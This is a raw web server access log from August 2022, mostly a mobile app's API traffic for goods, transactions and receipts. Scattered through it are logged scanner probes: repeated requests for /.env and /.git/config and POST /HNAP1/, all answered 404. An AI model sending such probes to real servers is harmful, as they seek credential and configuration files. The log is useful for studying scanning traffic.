::1 - - [14/Aug/2022:00:52:11 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::ffff:127.0.0.1 - - [14/Aug/2022:00:57:54 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::1 - - [14/Aug/2022:01:14:09 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [14/Aug/2022:01:14:10 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [14/Aug/2022:01:35:35 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [14/Aug/2022:01:35:35 +0000] "POST /HNAP1/ HTTP/1.0" 404 146 "-" "Mozila/5.0"
::1 - - [14/Aug/2022:02:00:34 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [14/Aug/2022:02:05:55 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [14/Aug/2022:02:05:56 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [14/Aug/2022:02:18:33 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [14/Aug/2022:02:18:35 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [14/Aug/2022:02:44:46 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::1 - - [14/Aug/2022:02:46:05 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "python-requests/2.28.1"
::ffff:127.0.0.1 - - [14/Aug/2022:02:53:35 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [14/Aug/2022:03:35:50 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [14/Aug/2022:03:35:51 +0000] "POST /HNAP1/ HTTP/1.0" 404 146 "-" "Mozila/5.0"
::1 - - [14/Aug/2022:04:49:42 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [14/Aug/2022:04:49:42 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [14/Aug/2022:04:54:52 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:127.0.0.1 - - [14/Aug/2022:05:06:01 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [14/Aug/2022:05:06:03 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [14/Aug/2022:05:11:28 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::1 - - [14/Aug/2022:05:35:10 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [14/Aug/2022:05:51:39 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [14/Aug/2022:05:51:39 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [14/Aug/2022:06:31:51 +0000] "GET / HTTP/1.0" 404 139 "-" "python-requests/2.27.1"
::1 - - [14/Aug/2022:07:30:36 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:30:39 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:30:45 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:32:39 +0000] "POST /api/v1/users/login HTTP/1.0" 200 556 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:32:40 +0000] "GET /api/v1/categories HTTP/1.0" 200 426 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:32:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:32:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:32:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:32:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:32:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:32:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:32:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:32:52 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:33:00 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:33:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:33:00 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:35:07 +0000] "POST /api/v1/goods HTTP/1.0" 200 371 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:35:08 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:35:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 512 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:35:09 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:35:12 +0000] "GET /api/v1/goods/62f8a5ab8e470b4b6899bd2b HTTP/1.0" 200 451 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:35:12 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:35:12 +0000] "GET /api/v1/transactions/user?good=62f8a5ab8e470b4b6899bd2b&sort=-createdAt HTTP/1.0" 200 119 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:35:12 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 534 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:35:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:35:15 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:35:42 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b HTTP/1.0" 200 393 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:35:58 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:36:16 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [14/Aug/2022:07:36:16 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [14/Aug/2022:07:36:46 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b HTTP/1.0" 200 393 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:39:16 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b HTTP/1.0" 200 393 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:39:16 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b HTTP/1.0" 200 393 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:39:17 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b HTTP/1.0" 200 393 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:39:19 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:39:21 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:39:21 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:39:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:39:23 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:39:27 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:39:27 +0000] "GET /api/v1/goods/62f8a5ab8e470b4b6899bd2b HTTP/1.0" 200 451 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:39:27 +0000] "GET /api/v1/transactions/user?good=62f8a5ab8e470b4b6899bd2b&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:39:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:39:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:39:32 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:41:14 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b HTTP/1.0" 200 393 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:41:15 +0000] "PUT /api/v1/goods/62f8a5ab8e470b4b6899bd2b/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:41:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:41:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:41:39 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:41:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:41:39 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:44:19 +0000] "POST /api/v1/goods HTTP/1.0" 200 380 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:44:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:44:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 949 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:44:24 +0000] "PUT /api/v1/goods/62f8a7d38e470b4b6899bd72/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:44:32 +0000] "POST /api/v1/transactions HTTP/1.0" 200 256 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:44:32 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:44:32 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:44:41 +0000] "GET /api/v1/goods/62f8a7d38e470b4b6899bd72 HTTP/1.0" 200 460 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:44:41 +0000] "GET /api/v1/transactions/user?good=62f8a7d38e470b4b6899bd72&sort=-createdAt HTTP/1.0" 200 119 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:44:41 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:44:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 971 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:44:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:44:50 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:44:50 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:45:10 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:45:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 801 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:45:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 801 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:45:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:45:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:45:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:45:32 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:45:32 +0000] "GET /api/v1/goods/62f8a7d38e470b4b6899bd72 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:45:32 +0000] "GET /api/v1/transactions/user?good=62f8a7d38e470b4b6899bd72&sort=-createdAt HTTP/1.0" 200 462 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:45:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:45:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:45:43 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:45:45 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 200 109 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:45:47 +0000] "GET /api/v1/users/62f2688099e2a94b91d43777 HTTP/1.0" 200 282 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:45:47 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:45:50 +0000] "GET /api/v1/users/logout HTTP/1.0" 200 39 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:46:03 +0000] "POST /api/v1/users/login HTTP/1.0" 200 556 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:46:04 +0000] "GET /api/v1/users/62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:46:06 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:46:06 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:46:07 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:46:08 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:46:08 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:46:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:46:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:46:33 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:46:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:46:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:48:35 +0000] "POST /api/v1/goods HTTP/1.0" 200 362 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:48:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1368 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:48:35 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:48:42 +0000] "PUT /api/v1/goods/62f8a8d28e470b4b6899bdd4/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:49:11 +0000] "POST /api/v1/templates HTTP/1.0" 200 208 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:49:11 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 284 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:49:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:49:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:49:21 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:49:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:49:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:49:28 +0000] "DELETE /api/v1/transactions/62f8a9018e470b4b6899bdf3 HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:49:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:49:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:49:42 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:49:42 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 458 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:49:42 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 458 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:49:48 +0000] "POST /api/v1/templates HTTP/1.0" 200 208 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:49:48 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 279 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:49:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:49:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:49:59 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:49:59 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1396 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:50:01 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 624 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:50:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:50:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:50:25 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:50:25 +0000] "GET /api/v1/goods/62f8a8d28e470b4b6899bdd4 HTTP/1.0" 200 442 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:50:25 +0000] "GET /api/v1/transactions/user?good=62f8a8d28e470b4b6899bdd4&sort=-createdAt HTTP/1.0" 200 531 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:50:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:50:28 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:51:47 +0000] "PUT /api/v1/goods/62f8a8d28e470b4b6899bdd4 HTTP/1.0" 200 384 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:51:49 +0000] "PUT /api/v1/goods/62f8a8d28e470b4b6899bdd4/upload-photo HTTP/1.0" 200 60 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:51:59 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:52:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:52:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:52:17 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:52:17 +0000] "GET /api/v1/goods/62f8a8d28e470b4b6899bdd4 HTTP/1.0" 200 442 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:52:17 +0000] "GET /api/v1/transactions/user?good=62f8a8d28e470b4b6899bdd4&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:52:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:52:20 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:52:29 +0000] "PUT /api/v1/goods/62f8a8d28e470b4b6899bdd4 HTTP/1.0" 200 384 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:52:34 +0000] "PUT /api/v1/goods/62f8a8d28e470b4b6899bdd4 HTTP/1.0" 200 384 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:52:42 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:52:44 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:52:44 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:52:44 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:52:50 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:52:50 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:52:50 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:52:52 +0000] "POST /api/v1/goods HTTP/1.0" 500 227 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:53:22 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 200 478 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:53:25 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
